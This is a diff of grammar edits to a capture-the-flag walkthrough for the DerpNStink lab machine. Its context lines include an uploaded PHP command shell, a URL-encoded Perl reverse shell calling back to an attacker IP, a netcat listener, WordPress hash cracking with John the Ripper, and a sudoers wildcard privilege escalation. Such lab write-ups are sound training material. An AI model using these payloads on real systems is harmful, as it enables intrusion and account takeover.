@@ -257,7 +257,7 @@ curl \
 rm -rf cookie
 {% endhighlight %}
 
-A simple PHP file that executes remote commands was uploaded using the script.
+A simple PHP file that executes remote command was uploaded using the script.
 
 ```
 # cat cmd.php
@@ -282,7 +282,7 @@ Since we are passing the above command to `cmd.php`, it's best to `urlencode` it
 http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/cmd.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.10.129%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27
 ```
 
-On my end, I just need to setup my `netcat` listener and wait for the shell.
+On my end, I just need to set up my `netcat` listener and wait for the shell.
 
 ![screenshot-1](/assets/images/posts/derpnstink-walkthrough/screenshot-1.png)
 
@@ -328,7 +328,7 @@ INSERT INTO `wp_users` VALUES (1,'unclestinky','$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC
 
 ### John the Ripper
 
-Using John the Ripper with a wordlist like "rockyou" from my attacking machine, cracking WordPress passwords has never been easier.
+Using John the Ripper with a wordlist like "rockyou" from my attacking machine, cracking WordPress password hash has never been easier.
 
 ```
 # john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
@@ -418,11 +418,11 @@ The resolution can be found at `https://pastebin.com/RzK9WfGw`.
 
 ![screenshot-6](/assets/images/posts/derpnstink-walkthrough/screenshot-6.png)
 
-This is in fact also the answer to privilege escalation unbeknownst to poor Mr. Derp and Uncle Stinky!
+Unbeknownst to poor Mr. Derp and Uncle Stinky, this is in fact the answer to privilege escalation.
 
 ### Privilege Escalation
 
-Assuming that `mrderp ALL=(ALL) /home/mrderp/binaries/derpy*` is in `/etc/sudoers`, we can do the following to gain `root` privileges.
+Assuming that `mrderp ALL=(ALL) /home/mrderp/binaries/derpy*` is in `/etc/sudoers`, we can take the following actions to gain `root` privileges.
 
 ```
 $ mkdir -p /home/mrderp/binaries
@@ -442,6 +442,8 @@ The fourth flag was at `/root/Desktop/flag.txt`.
 :dancer:
 
 ### Flags
+
+All the flags were captured.
 
 ```
 flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166)
